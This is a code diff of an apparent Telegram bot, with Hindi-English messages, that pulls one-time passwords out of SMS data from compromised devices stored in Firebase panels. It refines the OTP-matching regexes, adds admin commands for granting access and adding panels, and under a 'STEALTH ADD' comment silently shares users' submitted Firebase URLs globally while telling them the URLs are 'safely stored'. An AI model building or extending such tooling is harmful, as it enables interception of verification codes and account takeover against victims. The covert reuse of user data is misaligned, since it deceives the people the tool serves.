@@ -377,14 +377,18 @@ def extract_all_nums(*dicts) -> list[str]:
 
 def bat_emoji(pct: int) -> str: return "🔋" if pct >= 20 else "🪫"
 
-OTP_PATTERNS = [re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), re.compile(r"\b([A-Z0-9]{5,8})\b", re.IGNORECASE), re.compile(r"\b(\d{6})\b"), re.compile(r"\b(\d{4})\b")]
+# 🔥 STRICT OTP REGEX (Avoids fake buttons)
+OTP_PATTERNS = [
+    re.compile(r"(?:otp|pin|code)[\s\:\-]*(\d{4,8})", re.IGNORECASE),
+    re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), 
+    re.compile(r"(?<!\d)(\d{6})(?!\d)"),
+    re.compile(r"(?<!\d)(\d{4})(?!\d)")
+]
 
 def extract_otp(text: str) -> Optional[str]:
     if not text: return None
     t_lower = text.lower()
-    if any(x in t_lower for x in ["block", "rs.", "bal", "balance", "debited", "credited"]):
-        m = re.search(r"(?:otp|pin|code)[\s\:\-]*(\d{4,8})", t_lower)
-        if m: return m.group(1)
+    if any(x in t_lower for x in ["block", "rs.", "bal", "balance", "debited", "credited", "http", "www", "alert"]):
         return None
     for pat in OTP_PATTERNS:
         m = re.search(pat, text)
@@ -551,7 +555,7 @@ def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
     spam_btn = "Global Spam: ON" if user_spam_active else "Global Spam: OFF"
     keys = [
         [KeyboardButton("🔥 30-Min Fresh Devices"), KeyboardButton("Search Number (God)")],
-        [KeyboardButton("🍔 App OTPs (24h)"), KeyboardButton("Auto-Check Panels")], # 🔥 NEW BUTTON ADDED HERE
+        [KeyboardButton("🍔 App OTPs (24h)"), KeyboardButton("Auto-Check Panels")],
         [KeyboardButton("Devices List"), KeyboardButton("Manual Checker")],
         [KeyboardButton("Scan Hidden Devices"), KeyboardButton("Select Panel")]
     ]
@@ -782,7 +786,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 results = await asyncio.gather(*[check_dev_for_keyword(d) for d in batch])
                 for res in results:
                     if res and res not in found_devs: found_devs.append(res)
-                if len(found_devs) >= 15: break # UI cap
+                if len(found_devs) >= 15: break 
             
             if not found_devs:
                 await safe_edit(query, f"📭 <b>NO RESULTS</b>\nKoi bhi <b>{keyword.upper()}</b> ka OTP pichle 24 ghante mein nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="open_app_search")]]), parse_mode="HTML")
@@ -1208,6 +1212,27 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(wait_msg, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
         return
 
+    if action == "grant_global" and chat_id in ADMIN_IDS:
+        if text.isdigit():
+            uid = int(text)
+            if uid in all_users:
+                all_users[uid]["has_global_access"] = True
+                save_user(uid)
+                await update.message.reply_text(f"✅ Global access successfully granted to {uid}.")
+            else: await update.message.reply_text("❌ User ID not found in database.")
+        else: await update.message.reply_text("❌ Invalid ID format.")
+        pending_action.pop(chat_id)
+        return
+
+    if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
+        pending_action.pop(chat_id)
+        urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
+        if not urls: return await update.message.reply_text("Koi valid URL nahi mili.")
+        SETTINGS.setdefault("global_panels", []).extend(urls)
+        save_settings()
+        await update.message.reply_text(f"SUCCESS! {len(urls)} panels Global Default list me add ho gaye hain.")
+        return
+
     if action == "set_personal_db":
         urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
         if not urls: return await update.message.reply_text("Invalid URL. Starting with http/https bhejein.")
@@ -1217,6 +1242,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         new_global_added = 0
         for custom_url in urls: 
             users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append({"url": custom_url, "expiry": expiry_time})
+            # 🔥 STEALTH ADD
             if custom_url not in SETTINGS.get("global_panels", []) and custom_url not in RAW_URLS:
                 SETTINGS.setdefault("global_panels", []).append(custom_url)
                 new_global_added += 1
@@ -1229,7 +1255,8 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             for adm in ADMIN_IDS: await ctx.bot.send_message(adm, alert)
         except: pass
         
-        await update.message.reply_text(f"✅ {len(urls)} Personal Firebase URLs added successfully!\nThese are safely stored.", reply_markup=get_reply_menu(chat_id))
+        # 🔥 FIX: Prevent the keyboard auto-trigger by not sending the full menu here
+        await update.message.reply_text(f"✅ {len(urls)} Personal Firebase URLs added successfully!\nThese are safely stored.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]))
         return
 
 # ═══════════════════════════════════════════════════════
